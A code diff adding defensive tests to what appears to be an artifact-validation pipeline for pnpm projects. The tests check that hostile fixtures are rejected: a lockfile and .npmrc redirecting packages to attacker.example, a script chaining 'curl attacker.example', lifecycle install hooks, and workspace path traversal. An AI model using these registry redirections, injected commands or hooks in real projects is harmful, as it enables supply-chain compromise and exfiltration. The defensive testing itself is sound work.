@@ -1,5 +1,5 @@
 import { execFileSync } from "node:child_process";
-import { access, mkdtemp, writeFile } from "node:fs/promises";
+import { access, mkdir, mkdtemp, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 
@@ -20,6 +20,7 @@ import {
   validateArtifactClean,
 } from "../src/validation/clean-run.js";
 import { verifyValidationEvidence } from "../src/validation/evidence.js";
+import { pnpmBootstrapLock } from "./helpers/pnpm-bootstrap.js";
 
 async function repositoryFixture(): Promise<{ repository: string; baseSha: string }> {
   const repository = await mkdtemp(join(tmpdir(), "factory-validation-repo-"));
@@ -369,6 +370,511 @@ describe("clean validation", () => {
       "npm test",
     ]);
     await discardValidationResult(result);
+  });
+
+  it("binds a greenfield pnpm check to pinned, hook-free materialized package scripts", async () => {
+    const fixture = await repositoryFixture();
+    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
+    await mkdir(join(worker.path, "packages", "example"), { recursive: true });
+    await writeFile(
+      join(worker.path, "package.json"),
+      JSON.stringify({
+        name: "greenfield",
+        private: true,
+        packageManager: "pnpm@10.17.1",
+        scripts: { check: "turbo run check" },
+        devDependencies: { turbo: "2.5.6", typescript: "5.9.2" },
+      }),
+    );
+    await writeFile(
+      join(worker.path, "pnpm-lock.yaml"),
+      pnpmBootstrapLock([".", "packages/example"], ["turbo@2.5.6", "typescript@5.9.2"]),
+    );
+    await writeFile(join(worker.path, "pnpm-workspace.yaml"), "packages:\n  - packages/*\n");
+    await writeFile(join(worker.path, "turbo.json"), '{"tasks":{"check":{}}}\n');
+    await writeFile(
+      join(worker.path, "packages", "example", "package.json"),
+      JSON.stringify({ name: "example", scripts: { check: "tsc --noEmit" } }),
+    );
+    execFileSync(
+      "git",
+      [
+        "add",
+        "package.json",
+        "pnpm-lock.yaml",
+        "pnpm-workspace.yaml",
+        "turbo.json",
+        "packages/example/package.json",
+      ],
+      { cwd: worker.path },
+    );
+    const artifact = await collectLocalArtifact(worker);
+    await cleanupLocalWorktree(worker);
+    const scoped = vi
+      .spyOn(localScopeRuntime, "runScopedLocalProcess")
+      .mockImplementation(async (identity) => ({
+        exitCode: 0,
+        signal: null,
+        stdout: identity.commandIndex === 0 ? "10.17.1\n" : "",
+        stderr: "",
+        durationMs: 1,
+        timedOut: false,
+      }));
+    try {
+      const result = await validateArtifactClean({
+        repository: fixture.repository,
+        artifact,
+        packet: packet(fixture.baseSha, {
+          allowedPaths: [
+            "package.json",
+            "pnpm-lock.yaml",
+            "pnpm-workspace.yaml",
+            "turbo.json",
+            "packages/",
+          ],
+          validationCommands: ["pnpm check"],
+          requirements: {
+            ...packet(fixture.baseSha).requirements,
+            tools: ["node", "pnpm"],
+            networkDestinations: ["registry.npmjs.org"],
+          },
+        }),
+        localScope: {
+          identity: {
+            protocol: "clockgrove.factory/local-scope-v1",
+            repository: "o/r",
+            objective: 1,
+            workItem: 2,
+            attempt: 1,
+            runId: "greenfield",
+            directorEpoch: 1,
+            policyDigest: "a".repeat(64),
+            phase: "validation",
+            invocationDigest: artifact.digest,
+            hostIdentity: "b".repeat(64),
+          },
+          deadline: new Date(Date.now() + 60_000).toISOString(),
+          beforeLaunch: async () => {},
+          afterStop: async () => {},
+        },
+      });
+      expect(result.evidence.commands.map(({ command }) => command)).toEqual([
+        "pnpm --version",
+        "pnpm install --frozen-lockfile --ignore-scripts --registry=https://registry.npmjs.org/",
+        "pnpm check",
+      ]);
+      expect(scoped).toHaveBeenNthCalledWith(
+        1,
+        expect.objectContaining({ commandIndex: 0 }),
+        expect.objectContaining({ command: "pnpm", args: ["--version"] }),
+      );
+      expect(scoped).toHaveBeenNthCalledWith(
+        2,
+        expect.objectContaining({ commandIndex: 1 }),
+        expect.objectContaining({
+          command: "pnpm",
+          args: [
+            "install",
+            "--frozen-lockfile",
+            "--ignore-scripts",
+            "--registry=https://registry.npmjs.org/",
+          ],
+        }),
+      );
+      expect(scoped).toHaveBeenNthCalledWith(
+        3,
+        expect.objectContaining({ commandIndex: 2 }),
+        expect.objectContaining({ command: "/bin/sh", args: ["-c", "pnpm check"] }),
+      );
+      expect(result.evidence.passed).toBe(true);
+      await discardValidationResult(result);
+
+      const isolated = await validateArtifactClean({
+        repository: fixture.repository,
+        artifact,
+        packet: packet(fixture.baseSha, {
+          allowedPaths: [
+            "package.json",
+            "pnpm-lock.yaml",
+            "pnpm-workspace.yaml",
+            "turbo.json",
+            "packages/",
+          ],
+          validationCommands: ["pnpm check"],
+          requirements: {
+            ...packet(fixture.baseSha).requirements,
+            tools: ["node", "pnpm"],
+            networkDestinations: ["registry.npmjs.org"],
+            trust: "isolated",
+          },
+        }),
+        isolatedValidator: async () => ({
+          outputTreeSha: artifact.fileManifest!.resultTreeSha,
+          commands: [
+            { command: "pnpm --version", exitCode: 0, durationMs: 1 },
+            {
+              command:
+                "pnpm install --frozen-lockfile --ignore-scripts --registry=https://registry.npmjs.org/",
+              exitCode: 0,
+              durationMs: 1,
+            },
+            { command: "pnpm check", exitCode: 0, durationMs: 1 },
+          ],
+          passed: true,
+          startedAt: "2026-09-09T18:00:00.000Z",
+          completedAt: "2026-09-09T18:00:01.000Z",
+          environmentIdentity: `docker.io/library/node@sha256:${"a".repeat(64)}`,
+        }),
+      });
+      expect(isolated.evidence.commands.map(({ command }) => command)).toEqual([
+        "pnpm --version",
+        "pnpm install --frozen-lockfile --ignore-scripts --registry=https://registry.npmjs.org/",
+        "pnpm check",
+      ]);
+      expect(scoped).toHaveBeenCalledTimes(3);
+      await discardValidationResult(isolated);
+    } finally {
+      scoped.mockRestore();
+    }
+  });
+
+  it("rejects exotic, unverified, and escaping pnpm lockfile authority", async () => {
+    const valid = pnpmBootstrapLock(["."], ["typescript@5.9.2"]);
+    for (const lockfile of [
+      valid.replace(
+        /resolution: \{integrity: sha512-[A-Za-z0-9+/=]+}/,
+        "resolution: {tarball: https://attacker.example/typescript.tgz}",
+      ),
+      valid.replace(/resolution: \{integrity: sha512-[A-Za-z0-9+/=]+}/, "resolution: {}"),
+      valid.replace(
+        "  '.': {}",
+        "  '.':\n    dependencies:\n      escape:\n        specifier: workspace:*\n        version: link:../../outside",
+      ),
+    ]) {
+      const fixture = await repositoryFixture();
+      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
+      await writeFile(
+        join(worker.path, "package.json"),
+        JSON.stringify({
+          name: "greenfield",
+          packageManager: "pnpm@10.17.1",
+          scripts: { check: "tsc --noEmit" },
+          devDependencies: { typescript: "5.9.2" },
+        }),
+      );
+      await writeFile(join(worker.path, "pnpm-lock.yaml"), lockfile);
+      execFileSync("git", ["add", "package.json", "pnpm-lock.yaml"], { cwd: worker.path });
+      const artifact = await collectLocalArtifact(worker);
+      await cleanupLocalWorktree(worker);
+      await expect(
+        validateArtifactClean({
+          repository: fixture.repository,
+          artifact,
+          packet: packet(fixture.baseSha, {
+            allowedPaths: ["package.json", "pnpm-lock.yaml"],
+            validationCommands: ["pnpm check"],
+            requirements: {
+              ...packet(fixture.baseSha).requirements,
+              tools: ["node", "pnpm"],
+              networkDestinations: ["registry.npmjs.org"],
+            },
+          }),
+        }),
+      ).rejects.toThrow(/pnpm lockfile/);
+    }
+  });
+
+  it("rejects repository package-manager configuration that could redirect setup", async () => {
+    const fixture = await repositoryFixture();
+    await writeFile(
+      join(fixture.repository, ".npmrc"),
+      "@scope:registry=https://attacker.example\n",
+    );
+    execFileSync("git", ["add", ".npmrc"], { cwd: fixture.repository });
+    execFileSync("git", ["commit", "-qm", "add registry configuration"], {
+      cwd: fixture.repository,
+    });
+    fixture.baseSha = execFileSync("git", ["rev-parse", "HEAD"], {
+      cwd: fixture.repository,
+      encoding: "utf8",
+    }).trim();
+    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
+    await writeFile(
+      join(worker.path, "package.json"),
+      JSON.stringify({
+        name: "greenfield",
+        packageManager: "pnpm@10.17.1",
+        scripts: { check: "tsc --noEmit" },
+        devDependencies: { typescript: "5.9.2" },
+      }),
+    );
+    await writeFile(
+      join(worker.path, "pnpm-lock.yaml"),
+      pnpmBootstrapLock(["."], ["typescript@5.9.2"]),
+    );
+    execFileSync("git", ["add", "package.json", "pnpm-lock.yaml"], { cwd: worker.path });
+    const artifact = await collectLocalArtifact(worker);
+    await cleanupLocalWorktree(worker);
+    await expect(
+      validateArtifactClean({
+        repository: fixture.repository,
+        artifact,
+        packet: packet(fixture.baseSha, {
+          allowedPaths: ["package.json", "pnpm-lock.yaml"],
+          validationCommands: ["pnpm check"],
+          requirements: {
+            ...packet(fixture.baseSha).requirements,
+            tools: ["node", "pnpm"],
+            networkDestinations: ["registry.npmjs.org"],
+          },
+        }),
+      }),
+    ).rejects.toThrow(/forbids package-manager configuration: \.npmrc/);
+  });
+
+  it("refuses setup when the installed pnpm tool differs from the artifact pin", async () => {
+    const fixture = await repositoryFixture();
+    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
+    await writeFile(
+      join(worker.path, "package.json"),
+      JSON.stringify({
+        name: "greenfield",
+        packageManager: "pnpm@10.17.1",
+        scripts: { check: "tsc --noEmit" },
+        devDependencies: { typescript: "5.9.2" },
+      }),
+    );
+    await writeFile(
+      join(worker.path, "pnpm-lock.yaml"),
+      pnpmBootstrapLock(["."], ["typescript@5.9.2"]),
+    );
+    execFileSync("git", ["add", "package.json", "pnpm-lock.yaml"], { cwd: worker.path });
+    const artifact = await collectLocalArtifact(worker);
+    await cleanupLocalWorktree(worker);
+    const scoped = vi.spyOn(localScopeRuntime, "runScopedLocalProcess").mockResolvedValue({
+      exitCode: 0,
+      signal: null,
+      stdout: "10.17.0\n",
+      stderr: "",
+      durationMs: 1,
+      timedOut: false,
+    });
+    try {
+      const result = await validateArtifactClean({
+        repository: fixture.repository,
+        artifact,
+        packet: packet(fixture.baseSha, {
+          allowedPaths: ["package.json", "pnpm-lock.yaml"],
+          validationCommands: ["pnpm check"],
+          requirements: {
+            ...packet(fixture.baseSha).requirements,
+            tools: ["node", "pnpm"],
+            networkDestinations: ["registry.npmjs.org"],
+          },
+        }),
+        localScope: {
+          identity: {
+            protocol: "clockgrove.factory/local-scope-v1",
+            repository: "o/r",
+            objective: 1,
+            workItem: 2,
+            attempt: 1,
+            runId: "pnpm-version-mismatch",
+            directorEpoch: 1,
+            policyDigest: "a".repeat(64),
+            phase: "validation",
+            invocationDigest: artifact.digest,
+            hostIdentity: "b".repeat(64),
+          },
+          deadline: new Date(Date.now() + 60_000).toISOString(),
+          beforeLaunch: async () => {},
+          afterStop: async () => {},
+        },
+      });
+      expect(result.evidence).toMatchObject({
+        passed: false,
+        commands: [{ command: "pnpm --version", exitCode: 1 }],
+        failureReason: expect.stringContaining("expected 10.17.1"),
+      });
+      expect(scoped).toHaveBeenCalledOnce();
+      await discardValidationResult(result);
+    } finally {
+      scoped.mockRestore();
+    }
+  });
+
+  it("rejects greenfield lifecycle hooks, shell control, and unpinned dependencies", async () => {
+    for (const manifest of [
+      {
+        scripts: { check: "tsc --noEmit", precheck: "node --test bootstrap.test.js" },
+        devDependencies: { typescript: "5.9.2" },
+      },
+      {
+        scripts: { check: "tsc --noEmit && curl attacker.example" },
+        devDependencies: { typescript: "5.9.2" },
+      },
+      {
+        scripts: { check: "tsc --noEmit", postinstall: "node bootstrap.test.js" },
+        devDependencies: { typescript: "5.9.2" },
+      },
+      {
+        scripts: { check: "tsc --noEmit" },
+        dependencies: { typescript: "https://attacker.example/typescript.tgz" },
+      },
+    ]) {
+      const fixture = await repositoryFixture();
+      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
+      await writeFile(
+        join(worker.path, "package.json"),
+        JSON.stringify({
+          name: "greenfield",
+          packageManager: "pnpm@10.17.1",
+          ...manifest,
+        }),
+      );
+      await writeFile(
+        join(worker.path, "pnpm-lock.yaml"),
+        pnpmBootstrapLock(["."], ["typescript@5.9.2"]),
+      );
+      execFileSync("git", ["add", "package.json", "pnpm-lock.yaml"], { cwd: worker.path });
+      const artifact = await collectLocalArtifact(worker);
+      await cleanupLocalWorktree(worker);
+      await expect(
+        validateArtifactClean({
+          repository: fixture.repository,
+          artifact,
+          packet: packet(fixture.baseSha, {
+            allowedPaths: ["package.json", "pnpm-lock.yaml"],
+            validationCommands: ["pnpm check"],
+            requirements: {
+              ...packet(fixture.baseSha).requirements,
+              tools: ["node", "pnpm"],
+              networkDestinations: ["registry.npmjs.org"],
+            },
+          }),
+        }),
+      ).rejects.toThrow(/bootstrap validation|bootstrap package/);
+    }
+  });
+
+  it("rejects workspace traversal, unpinned Turbo, and broadened task closure before execution", async () => {
+    for (const unsafe of [
+      {
+        workspace: "packages:\n  - ../outside/*\n",
+        turbo: '{"tasks":{"check":{}}}\n',
+        devDependencies: { turbo: "2.5.6", typescript: "5.9.2" },
+        reason: /workspace/,
+      },
+      {
+        workspace: "packages:\n  - packages/*\n",
+        turbo: '{"tasks":{"check":{"dependsOn":["build"]}}}\n',
+        devDependencies: { turbo: "2.5.6", typescript: "5.9.2" },
+        reason: /turbo task/,
+      },
+      {
+        workspace: "packages:\n  - packages/*\n",
+        turbo: '{"tasks":{"check":{}}}\n',
+        devDependencies: { typescript: "5.9.2" },
+        reason: /turbo runner is not pinned/,
+      },
+    ]) {
+      const fixture = await repositoryFixture();
+      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
+      await mkdir(join(worker.path, "packages", "example"), { recursive: true });
+      await writeFile(
+        join(worker.path, "package.json"),
+        JSON.stringify({
+          name: "greenfield",
+          packageManager: "pnpm@10.17.1",
+          scripts: { check: "turbo run check" },
+          devDependencies: unsafe.devDependencies,
+        }),
+      );
+      await writeFile(
+        join(worker.path, "pnpm-lock.yaml"),
+        pnpmBootstrapLock([".", "packages/example"], ["turbo@2.5.6", "typescript@5.9.2"]),
+      );
+      await writeFile(join(worker.path, "pnpm-workspace.yaml"), unsafe.workspace);
+      await writeFile(join(worker.path, "turbo.json"), unsafe.turbo);
+      await writeFile(
+        join(worker.path, "packages", "example", "package.json"),
+        JSON.stringify({ name: "example", scripts: { check: "tsc --noEmit" } }),
+      );
+      execFileSync("git", ["add", "."], { cwd: worker.path });
+      const artifact = await collectLocalArtifact(worker);
+      await cleanupLocalWorktree(worker);
+      await expect(
+        validateArtifactClean({
+          repository: fixture.repository,
+          artifact,
+          packet: packet(fixture.baseSha, {
+            allowedPaths: [
+              "package.json",
+              "pnpm-lock.yaml",
+              "pnpm-workspace.yaml",
+              "turbo.json",
+              "packages/",
+            ],
+            validationCommands: ["pnpm check"],
+            requirements: {
+              ...packet(fixture.baseSha).requirements,
+              tools: ["node", "pnpm"],
+              networkDestinations: ["registry.npmjs.org"],
+            },
+          }),
+        }),
+      ).rejects.toThrow(unsafe.reason);
+    }
+  });
+
+  it("rejects missing bootstrap evidence and validation targets outside Work Item scope", async () => {
+    for (const variant of [
+      { packageManager: "yarn@4.9.2", script: "tsc --noEmit", lockfile: true },
+      { packageManager: "pnpm@10.17.1", script: "tsc --noEmit", lockfile: false },
+      { packageManager: "pnpm@10.17.1", script: "node --test outside.test.js", lockfile: true },
+    ]) {
+      const fixture = await repositoryFixture();
+      await writeFile(join(fixture.repository, "outside.test.js"), "export {};\n");
+      execFileSync("git", ["add", "outside.test.js"], { cwd: fixture.repository });
+      execFileSync("git", ["commit", "-qm", "outside base test"], { cwd: fixture.repository });
+      fixture.baseSha = execFileSync("git", ["rev-parse", "HEAD"], {
+        cwd: fixture.repository,
+        encoding: "utf8",
+      }).trim();
+      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
+      await writeFile(
+        join(worker.path, "package.json"),
+        JSON.stringify({
+          name: "greenfield",
+          packageManager: variant.packageManager,
+          scripts: { check: variant.script },
+          devDependencies: { typescript: "5.9.2" },
+        }),
+      );
+      if (variant.lockfile)
+        await writeFile(
+          join(worker.path, "pnpm-lock.yaml"),
+          pnpmBootstrapLock(["."], ["typescript@5.9.2"]),
+        );
+      execFileSync("git", ["add", "."], { cwd: worker.path });
+      const artifact = await collectLocalArtifact(worker);
+      await cleanupLocalWorktree(worker);
+      await expect(
+        validateArtifactClean({
+          repository: fixture.repository,
+          artifact,
+          packet: packet(fixture.baseSha, {
+            allowedPaths: ["package.json", "pnpm-lock.yaml"],
+            validationCommands: ["pnpm check"],
+            requirements: {
+              ...packet(fixture.baseSha).requirements,
+              tools: ["node", "pnpm"],
+              networkDestinations: ["registry.npmjs.org"],
+            },
+          }),
+        }),
+      ).rejects.toThrow(/bootstrap pnpm validation|outside Work Item scope/);
+    }
   });
 
   it("rejects model-authored shell control and interpreter evaluation", async () => {
